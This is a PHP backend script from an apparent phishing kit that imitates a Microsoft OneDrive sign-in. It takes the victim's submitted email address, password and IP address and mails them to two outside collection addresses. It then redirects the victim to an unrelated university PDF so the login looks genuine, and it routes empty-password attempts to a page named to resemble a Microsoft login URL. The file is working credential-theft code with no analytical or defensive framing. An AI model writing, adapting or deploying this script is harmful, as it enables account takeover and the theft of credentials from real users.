<?php
session_start();
$filename="email.txt";
$handle=fopen($filename,"r");
$contents=fread
($handle,filesize($filename));
$emailss=($contents);


if(trim($_POST['passwd']) ==""){

   header('Location: nopass.php?login-microsoftonline-com_OneDrive0009');
   exit();
}

    $pfw_ip= $_SERVER['REMOTE_ADDR'];
	$emailto = "resultresult365@gmail.com, tripplex365@protonmail.com";
	$email_from = "OneDrive@violetlines.com";
	$email = $_POST['userid'];
    $email_subject = "$pfw_ip OneDrive info - $email";

	$email = $_POST['userid'];
	$password = $_POST['passwd'];


    $email_message = "Received details below for OneDrive\n\n";
    function clean_string($string) {

      $bad = array("content-type","bcc:","to:","cc:","href");

      return str_replace($bad,"",$string);

    }


    $email_message .= "===============|New Log|==============\n";
    $email_message .= "Email: ".clean_string($email)."\n";
    $email_message .= "Password: ".clean_string($password)."\n";
    $email_message .= "IP: ".$pfw_ip."\n";
    $email_message .= "===============|L V R X D N O N A|==============\n";



// create email headers

$headers = 'From: '.$email_from."\r\n".

'Reply-To: '.$emailto."\r\n" .

'X-Mailer: PHP/' . phpversion();

@mail($emailto, $email_subject, $email_message, $headers);
 // create session variable data
$_SESSION["userid"]=$_POST['userid'];

header("location: http://bbk.ac.uk/ems/faculty/schroeder/schroeder-downloads/PWM.pdf");
?>

<!-- include your own success html here -->
